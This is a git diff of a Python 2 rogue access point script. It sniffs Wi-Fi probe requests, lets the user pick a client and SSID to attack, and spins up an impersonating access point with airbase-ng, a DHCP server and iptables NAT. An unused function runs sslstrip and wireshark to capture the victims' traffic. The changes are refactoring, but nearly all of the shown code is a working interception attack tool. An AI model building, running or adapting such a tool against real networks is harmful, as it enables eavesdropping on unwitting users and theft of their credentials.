@@ -3,9 +3,10 @@
 
 import sys
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 try:
-    from scapy.all import *
+    from scapy.all import sniff, Ether, sendp, Dot11, IP 
 except:
     try:
         from scapy import *
@@ -15,10 +16,8 @@ except:
 
 from datetime import datetime
 import threading
-import types
 from multiprocessing import Process
-from subprocess import call
-from subprocess import Popen
+import subprocess
 from scapy.error import Scapy_Exception
 import argparse
 import time
@@ -38,6 +37,8 @@ class Sniffing(threading.Thread):
         
         try:
             def sort(pkt):
+                """Print only probe requests"""
+                
                 global INDEX
                 global N
 
@@ -56,6 +57,8 @@ class Sniffing(threading.Thread):
         
         try:
             def stop(pkt):
+                """Little trick to stop sniffing properly"""
+                
                 packet_to_string = str(pkt)
                 if packet_to_string.find("1.1.1.1"):
                     return True
@@ -88,13 +91,13 @@ def choice():
             number_to_attack = input("Select which # you want to attack (type a number): ")
             
             if number_to_attack in INDEX.values():
-                for tuple, number in INDEX.items():
+                for couple, number in INDEX.items():
                     if number == number_to_attack:
-                        client_to_attack, ssid_to_attack = tuple
+                        client_to_attack, ssid_to_attack = couple
                         number_is_correct = True
-                        print "You choosed to attack Client %s with SSID %s" % (client_to_attack, ssid_to_attack)
+                        print "\nYou choosed to attack Client %s with SSID %s\n" % (client_to_attack, ssid_to_attack)
             else:
-                print "Type a number in the range (1,%s)" % (len(INDEX))    
+                print "\nType a number in the range (1,%s)" % (len(INDEX))    
 
     return ssid_to_attack
      
@@ -111,15 +114,15 @@ def macchanger(monitor_interface, internet_interface): #Not used for the moment
             ifconfig {5} up".format(monitor_interface, internet_interface, 
                     monitor_interface, internet_interface, monitor_interface, internet_interface)
     try:
-        retcode = call(cmd, stdout=0, shell=True)
+        retcode = subprocess.call(cmd, stdout=0, shell=True)
         
         if retcode < 0:
             print >> sys.stderr, "Child was terminated by signal", -retcode
         else:
             print "Your MAC adresses have changed."
             
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
 
 
 
@@ -133,24 +136,26 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
             iptables -t nat --delete-chain'
 
     try:
-        retcode = call(cmd_clean_iptables, stdout=0, shell=True)
-
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+        retcode = subprocess.call(cmd_clean_iptables, stdout=0, shell=True)
+        
+        if retcode < 0:
+            print >> sys.stderr, "Child was terminated by signal", -retcode
+ 
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
     
 
     try:
-        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", 
-                ssid_to_attack, monitor_interface])
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", ssid_to_attack, monitor_interface])
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
         proc_rogue_ap.kill()
     except KeyboardInterrupt:
         proc_rogue_ap.kill()
     
-    file = open("/etc/udhcpd.conf", 'w')
-    file.write("max_leases 30\nstart 10.1.23.10\nend 10.1.23.100\ninterface at0\ndomain local\noption dns 8.8.8.8\noption subnet 255.255.255.0\noption router 10.1.23.1\nlease 7200\nlease file /tmp/udhcpd.leases")
-    file.close()
+    file_config_dhcp = open("/etc/udhcpd.conf", 'w')
+    file_config_dhcp.write("max_leases 30\nstart 10.1.23.10\nend 10.1.23.100\ninterface at0\ndomain local\noption dns 8.8.8.8\noption subnet 255.255.255.0\noption router 10.1.23.1\nlease 7200\nlease file /tmp/udhcpd.leases")
+    file_config_dhcp.close()
 
     cmd_configuration_ap = 'sleep 2 ; \
     touch /tmp/udhcpd.leases ; \
@@ -162,9 +167,13 @@ def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
     
     try:
         dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])
-        retcode = call(cmd_configuration_ap, stdout=0, shell=True)
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+        retcode = subprocess.call(cmd_configuration_ap, stdout=0, shell=True)
+        
+        if retcode < 0:
+            print >> sys.stderr, "Child was terminated by signal", -retcode
+        
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
     except KeyboardInterrupt:
         dhcp_server.kill()
 
@@ -173,8 +182,8 @@ def exploitation(): #Not used for the moment
     """Tools to analyse traffic"""
     try:
         proc_iptables = subprocess.Popen(["sslstrip", "-w", "/root/Desktop/rogue.txt"])
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
         proc_iptables.kill()
     except KeyboardInterrupt:
         proc_iptables.kill()
@@ -182,15 +191,16 @@ def exploitation(): #Not used for the moment
         
     try:
         proc_iptables = subprocess.Popen(["wireshark", "-i", "at0", "-k", "&"])
-    except OSError as e:
-        print >> sys.stderr, "Execution failed:", e
+    except OSError as error:
+        print >> sys.stderr, "Execution failed:", error
         proc_iptables.kill()
     except KeyboardInterrupt:
         proc_iptables.kill()    
         
 
 def main():
-  
+    """Main"""
+    
     internet_interface = "eth0"
     monitor_interface = "wlan0mon"
     ssid_to_attack = "FreeWifi"
@@ -223,6 +233,8 @@ def main():
             sendp(mon_ping, verbose=False)
         
         choice_correct = False
+        
+        print "\nType a number in the range (1,%s)" % (len(INDEX))
         while choice_correct is False:
             try:
                 ssid_to_attack = choice()
@@ -231,34 +243,31 @@ def main():
                 print "\n\n! Received keyboard interrupt, quitting choice ! \n"
                 sys.exit()
             except (SyntaxError, NameError):
-                print "Type a number in the range (1,%s)" % (len(INDEX))
-        
-        print internet_interface
-        print monitor_interface
-        print ssid_to_attack
+                print "\nType a number in the range (1,%s)" % (len(INDEX))
         
         try:
-            f = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
+            proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
                     internet_interface))
-            f.start()
-            f.join()
+            proc.start()
+            proc.join()
             time.sleep(86400)    
         except (KeyboardInterrupt, SystemExit):
             print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
-            f.terminate()
+            proc.terminate()
         
+    
     else:
         ssid_to_attack = args.SSID
         try:
-            p = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
+            proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, monitor_interface, 
                     internet_interface))
-            p.start()
+            proc.start()
+            proc.join()
+            time.sleep(86400)
         except (KeyboardInterrupt, SystemExit):
             print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
-            p.terminate()
-        
-       
-        
-    
-if __name__=="__main__":
+            proc.terminate()
+   
+   
+if __name__ == "__main__":
     main()              
